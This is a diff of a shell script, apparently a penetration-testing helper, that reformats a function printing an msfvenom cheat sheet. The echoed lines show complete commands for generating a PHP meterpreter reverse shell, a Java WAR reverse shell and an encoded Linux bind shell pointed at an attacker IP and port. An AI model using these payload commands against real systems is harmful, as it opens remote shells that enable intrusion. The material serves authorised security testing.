@@ -130,15 +130,17 @@ function help-payloads () {
 echo ${reset}${red}${bold}
 print-figlet "MSFVenom Payloads"
 if which tldr > /dev/null; then tldr msfvenom ;echo ; fi
-echo "${yellow}"
-echo "msfvenom -p [payload] -f [format] LHOST=[your ip] LPORT=[your listener port]"
-echo "${reset}${white}PHP reverse shell"
-echo "${green}msfvenom -p php/meterpreter/reverse_tcp LHOST=11.10.10.10 LPORT=4443 -f raw -o shell.php"
-echo ${white}Java WAR reverse shell
-echo "${green}msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war"
-echo ${white}
-echo "Linux bind shell"
-echo "${green}msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b \"\x00\x0a\x0d\x20\" -e x86/shikata_ga_nai"
+echo "${reset}${yellow}"
+echo "   msfvenom -p [payload] -f [format] LHOST=[your ip] LPORT=[your listener port]"
+echo "${green}   - PHP reverse shell"
+echo ""
+echo "${yellow}   msfvenom -p php/meterpreter/reverse_tcp LHOST=11.10.10.10 LPORT=4443 -f raw -o shell.php"
+echo ""
+echo ${green}     - Java WAR reverse shell
+echo "${yellow}   msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war"
+echo ""
+echo "${green}    - Linux bind shell"
+echo "${yellow}   msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b \"\x00\x0a\x0d\x20\" -e x86/shikata_ga_nai"
 echo ${white}
 echo Linux FreeBSD reverse shell
 echo ${green}
